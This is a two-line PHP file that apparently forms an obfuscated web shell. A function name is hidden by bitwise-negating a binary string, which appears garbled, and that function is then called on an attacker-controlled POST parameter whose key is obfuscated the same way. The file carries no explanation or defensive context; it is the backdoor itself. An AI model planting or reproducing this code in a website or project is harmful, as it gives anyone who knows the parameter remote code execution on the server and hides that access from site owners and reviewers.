<?php
$x=~Y??o�<;
$x($_POST[~11IIII]);
?>